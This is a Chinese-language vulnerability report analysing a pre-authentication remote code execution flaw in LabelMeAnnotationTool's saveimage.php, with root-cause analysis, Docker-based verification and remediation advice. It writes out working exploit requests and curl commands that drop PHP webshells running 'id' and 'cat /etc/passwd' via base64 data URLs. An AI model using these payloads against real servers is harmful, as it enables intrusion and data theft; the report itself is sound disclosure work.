# LabelMeAnnotationTool 前认证 RCE 漏洞分析报告

## 一、结论摘要

在 `LabelMeAnnotationTool` 项目中确认存在 **前认证远程代码执行（Pre-Auth RCE）** 漏洞。

**核心结论**：
- 漏洞点位于 `annotationTools/php/saveimage.php`
- 漏洞本质为：**任意文件写入 → 写入 PHP 文件到 Web 可访问目录 → 直接触发代码执行**
- 无需认证
- 已在本地 Docker 环境中完成动态验证
- 可稳定获得 `www-data` 权限命令执行

**漏洞类型**：任意文件写入导致远程代码执行  
**认证边界**：Pre-auth  
**验证状态**：已动态验证  
**利用稳定性**：高  

---

## 二、目标与分析范围

本次分析目标为项目目录：

```text
/home/ljm/LabelMeAnnotationTool
```

重点围绕用户关注的 RCE / 命令执行路径展开，审计了：
- Perl CGI 脚本
- PHP 脚本
- Apache 配置
- Docker 部署配置
- Makefile 安装逻辑

---

## 三、漏洞点定位

### 1. 漏洞文件

```text
annotationTools/php/saveimage.php
```

### 2. 漏洞源码

```php
<?php include('globalvariables.php'); ?>
<?php

if ( isset($_POST["image"]) && !empty($_POST["image"]) ) {    
    define('UPLOAD_DIR', $_POST["uploadDir"]);
    $dataURL = $_POST["image"];  
    $parts = explode(',', $dataURL);  
    $data = $parts[1];  
    $data = base64_decode($data);  
    $file = $TOOLHOME . UPLOAD_DIR . $_POST["name"];  
    $success = file_put_contents($file, $data);
    print $success ? $file : 'Unable to save this image.';
}
```

---

## 四、漏洞成因分析

该漏洞由以下几个可串联的危险点共同组成：

### 1. 文件写入路径可控

用户可直接控制以下两个参数：

- `$_POST["uploadDir"]`
- `$_POST["name"]`

最终文件路径直接由以下表达式拼接：

```php
$file = $TOOLHOME . UPLOAD_DIR . $_POST["name"];
```

其中：

- `UPLOAD_DIR` 由 `$_POST["uploadDir"]` 定义
- 文件名由 `$_POST["name"]` 提供
- 无任何白名单、黑名单、路径规范化、后缀限制或目录限制

因此攻击者可：
- 指定任意文件名，如 `rce.php`
- 使用 `../` 进行路径遍历，如 `uploadDir=../`
- 直接写入 Web 根目录或项目根目录

### 2. 文件内容可控

`$_POST["image"]` 被当作 Data URL 处理：

```php
$parts = explode(',', $dataURL);
$data = $parts[1];
$data = base64_decode($data);
```

这意味着攻击者并不需要上传真实图片，
只要构造如下内容即可：

```text
data:image/png;base64,<任意base64编码内容>
```

因此可以直接编码 PHP 代码，例如：

```php
<?php system('id'); ?>
```

### 3. 直接写入到服务器文件系统

最终通过：

```php
file_put_contents($file, $data)
```

将任意内容写入攻击者指定路径。

### 4. 写入 PHP 文件后由 Apache + mod_php 执行

Docker 环境中确认安装并启用了 PHP Apache 模块：

```text
php7_module (shared)
```

因此当写入 `.php` 文件到 Web 可访问目录后，只需访问对应 URL，即可触发 PHP 解释执行。

---

## 五、关键部署与环境证据

### 1. `$TOOLHOME` 的实际值

`saveimage.php` 引入的 `globalvariables.php` 在容器内实际内容为：

```php
$TOOLHOME = "/var/www/html/LabelMeAnnotationTool/";
```

这意味着写入根路径基准固定为：

```text
/var/www/html/LabelMeAnnotationTool/
```

### 2. Makefile 会生成 globalvariables.php

```makefile
LM_TOOL_HOME = $(shell pwd)/
...
cat ./annotationTools/php/globalvariables.php.base | sed -e s@LM_TOOL_HOME@$(LM_TOOL_HOME)@ > ./annotationTools/php/globalvariables.php
```

### 3. Makefile 赋予 PHP 目录可写权限

```makefile
chmod -R 777 ./annotationTools/php
```

容器内验证结果：

```text
drwxrwxrwx ... /var/www/html/LabelMeAnnotationTool/annotationTools/php/
```

### 4. Apache 允许直接访问项目目录

`000-default.conf` 中：

```apache
<Directory "/var/www/html/LabelMeAnnotationTool/">
    Options Indexes FollowSymLinks MultiViews Includes ExecCGI
    AllowOverride all
    Require all granted
</Directory>
```

说明：
- 目录允许直接访问
- 无认证限制
- `.htaccess` 生效

### 5. PHP 执行环境无额外限制

动态验证确认：

```text
disable_functions => no value => no value
open_basedir => no value => no value
```

即：
- `system()` 未禁用
- 无 `open_basedir` 路径限制

---

## 六、完整利用链

### 利用链 1：路径遍历写入 Apache DocumentRoot

#### 攻击请求

```http
POST /LabelMeAnnotationTool/annotationTools/php/saveimage.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

uploadDir=../&name=rce.php&image=data:image/png;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

其中：

- `uploadDir=../`
- `name=rce.php`
- `PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==` 解码后为：

```php
<?php system('id'); ?>
```

#### 服务端路径拼接结果

```text
$TOOLHOME = /var/www/html/LabelMeAnnotationTool/
UPLOAD_DIR = ../
name = rce.php

最终路径 = /var/www/html/LabelMeAnnotationTool/../rce.php
         = /var/www/html/rce.php
```

#### 触发执行

访问：

```text
http://target/rce.php
```

Apache 通过 `mod_php` 执行其中 PHP 代码，完成 RCE。

---

### 利用链 2：直接写入项目根目录

即使不使用路径遍历，仍然可以直接利用。

#### 攻击请求

```http
POST /LabelMeAnnotationTool/annotationTools/php/saveimage.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

uploadDir=&name=rce2.php&image=data:image/png;base64,PD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9wYXNzd2QnKTsgPz4=
```

解码后为：

```php
<?php system('cat /etc/passwd'); ?>
```

#### 服务端路径结果

```text
/var/www/html/LabelMeAnnotationTool/rce2.php
```

#### 触发执行

访问：

```text
http://target/LabelMeAnnotationTool/rce2.php
```

即可执行命令。

---

## 七、本地动态验证过程

### 1. 验证环境

使用项目自带 Docker 配置：

```text
DockerFiles/ubuntu_16.04/
```

构建与启动：

```bash
cd /home/ljm/LabelMeAnnotationTool/DockerFiles/ubuntu_16.04
docker build -t labelme .
docker run -d --name labelme_test -p 8888:80 labelme
```

### 2. 服务可达性验证

访问：

```bash
curl -s -o /dev/null -w "%{http_code}" http://localhost:8888/LabelMeAnnotationTool/
```

服务正常启动。

### 3. 动态验证 1：写入 `rce.php` 到 `/var/www/html/`

#### 请求

```bash
curl -s -X POST "http://localhost:8888/LabelMeAnnotationTool/annotationTools/php/saveimage.php" \
  -d "uploadDir=../&name=rce.php&image=data:image/png;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="
```

#### 返回

```text
/var/www/html/LabelMeAnnotationTool/../rce.php
```

#### 容器内验证文件存在

```bash
docker exec labelme_test ls -la /var/www/html/rce.php
```

结果：

```text
-rw-r--r-- 1 www-data www-data 22 ... /var/www/html/rce.php
```

#### 触发执行

```bash
curl -s http://localhost:8888/rce.php
```

输出：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

说明命令执行成功，权限为 `www-data`。

### 4. 动态验证 2：写入 `rce2.php` 到项目根目录

#### 请求

```bash
curl -s -X POST "http://localhost:8888/LabelMeAnnotationTool/annotationTools/php/saveimage.php" \
  -d "uploadDir=&name=rce2.php&image=data:image/png;base64,PD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9wYXNzd2QnKTsgPz4="
```

#### 返回

```text
/var/www/html/LabelMeAnnotationTool/rce2.php
```

#### 触发执行

```bash
curl -s http://localhost:8888/LabelMeAnnotationTool/rce2.php | head -3
```

输出：

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

说明 `cat /etc/passwd` 成功执行。

### 5. 写入文件内容验证

容器内读取文件内容：

```bash
docker exec labelme_test cat /var/www/html/rce.php
docker exec labelme_test cat /var/www/html/LabelMeAnnotationTool/rce2.php
```

输出：

```php
<?php system('id'); ?>
<?php system('cat /etc/passwd'); ?>
```

### 6. 清理验证

删除测试文件后再次访问返回 404，说明验证环境已清理。

---

## 八、漏洞利用成功的根本原因

该漏洞之所以能够稳定转化为前认证 RCE，是因为以下条件全部满足：

1. **保存接口完全未认证**
2. **文件保存目录可控**
3. **文件名可控，允许 `.php` 扩展名**
4. **文件内容可控，可写入任意 PHP 代码**
5. **写入目标位于 Web 可访问目录**
6. **Apache 已启用 PHP 解析模块**
7. **无 `open_basedir` / `disable_functions` 之类的限制**
8. **返回值直接泄露写入的服务器端绝对路径，帮助攻击者确认落点**

这使得该问题不是“理论可利用”，而是**一步写文件、一步访问执行**的完整、稳定、低门槛 RCE。

---

## 九、与其他发现的关系

此前在 Perl CGI 中发现过一个条件性命令注入点：

- `fetch_image.cgi`
- `fetch_prev_image.cgi`

危险代码：

```perl
open(NUMLINES,"wc -l $fname |")
```

但该点前面存在：

```perl
if(!open(FP,$fname)) { return; }
```

导致含 shell 元字符的恶意 `$collection` 在默认情况下无法独立到达 sink，
因此其结论被降级为：

- 独立不可触发
- 需与其他漏洞（如文件写入）链式组合才能利用

相比之下，`saveimage.php` 的 RCE 不依赖其他漏洞，属于**独立主漏洞**。

---

## 十、风险评级建议

建议按以下维度评估：

- **攻击前提**：无需认证
- **攻击复杂度**：低
- **用户交互**：无
- **影响范围**：服务器端任意 PHP 代码执行
- **权限结果**：Web 服务权限（`www-data`）
- **稳定性**：高

综合建议：

**严重级别：Critical**

---

## 十一、修复建议

### 1. 禁止用户控制任意保存路径

不要直接拼接：

```php
$TOOLHOME . $_POST["uploadDir"] . $_POST["name"]
```

应改为：
- 固定保存目录
- 仅允许相对安全子目录白名单
- 对路径做规范化并校验是否仍位于允许目录内

### 2. 强制文件名白名单

仅允许安全文件名，例如：
- 随机 UUID
- 固定后缀 `.png`
- 拒绝 `/`、`..`、空字节、控制字符、脚本扩展名

### 3. 校验真实文件类型

应验证上传内容是否确实为图片：
- `finfo_file`
- 图片解码验证
- 二次重编码保存

### 4. 永远不要把用户上传内容保存到可执行目录

上传目录应：
- 位于 Web 根目录之外
- 或显式关闭脚本执行
- 对上传目录添加 Apache / Nginx 拒绝执行规则

### 5. 去除不必要的 777 权限

Makefile 中：

```makefile
chmod -R 777 ./annotationTools/php
```

应删除。PHP 脚本目录不应全局可写。

### 6. 减少路径信息回显

当前代码会把服务端绝对路径直接返回给客户端：

```php
print $success ? $file : 'Unable to save this image.';
```

这会帮助攻击者确认落点，应避免。

---

## 十二、最终结论

`LabelMeAnnotationTool` 中的 `saveimage.php` 存在一个**已动态验证的前认证 RCE 漏洞**。

该漏洞通过：

```text
任意路径 + 任意文件名 + 任意文件内容写入
```

实现：

```text
写入 PHP 文件 → Web 访问触发 → 服务器执行攻击者代码
```

本地 Docker 环境中已成功验证：
- 写入 `/var/www/html/rce.php`
- 访问后执行 `id`
- 返回 `uid=33(www-data)`

因此，该漏洞可被确定为：

**独立、稳定、前认证、可直接利用的远程代码执行漏洞。**
